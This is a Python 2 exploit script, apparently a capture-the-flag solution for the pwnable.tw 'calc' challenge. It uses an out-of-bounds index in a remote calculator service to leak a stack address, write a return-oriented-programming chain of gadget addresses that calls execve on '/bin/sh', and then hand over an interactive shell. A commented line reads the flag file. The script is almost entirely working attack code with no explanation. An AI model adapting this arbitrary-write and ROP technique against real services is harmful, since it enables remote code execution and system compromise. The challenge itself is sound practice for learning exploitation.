#! /usr/bin/python

import sys
import struct
import socket
import telnetlib

def q(s, o, v):
	s.send('+' + str(o) + chr(0x0a))
	prev = int(readuntil(s, chr(0x0a)))
	curr = v - prev

	if curr < 0:
		buf = '-' + str(abs(curr))
	else:
		buf = '+' + str(curr)

	s.send('+' + str(o) + buf + chr(0x0a))

	q = int(s.recv(1024))
	print "[*] addr: " + hex(q)

def r(s, o):
	s.send('+' + str(o) + chr(0x0a))
	v = int(readuntil(s, chr(0x0a)))

	return v

def ropchain(s, ebp):
	q(s, 361, 0x0805c34b)
	q(s, 362, 11)
	q(s, 363, 0x080701aa)	
	q(s, 364, 0)
	q(s, 365, 0x080701d1)
	q(s, 366, 0)
	q(s, 367, ebp + 36)
	q(s, 368, 0x08049a21)
	q(s, 369, 0x6e69622f)
	q(s, 370, 0x0068732f)
	#s.send("AAAA" + chr(0x0a))
	#s.send("BBBB" + chr(0x0a))

	# s.send("cat /home/calc/flag" + chr(0x0a))

	# print s.recv(1024)
		
def readuntil(s, delim=':'):
	buf = ''
	while not buf.endswith(delim):
		buf += s.recv(1)
	return buf

try:
	s = socket.create_connection(("chall.pwnable.tw", 10100))
except socket.gaierror as e:
	sys.exit(-1)

# trash output buffer
s.recv(1024)

prev_ebp = r(s, 360)
prev_ebp = prev_ebp - 0x20

print "[*] Previous %ebp: " + str(prev_ebp).encode('ascii')
print "[*] Sending crafted ropchain.."

ropchain(s, prev_ebp)

t = telnetlib.Telnet()
t.sock = s
t.interact()
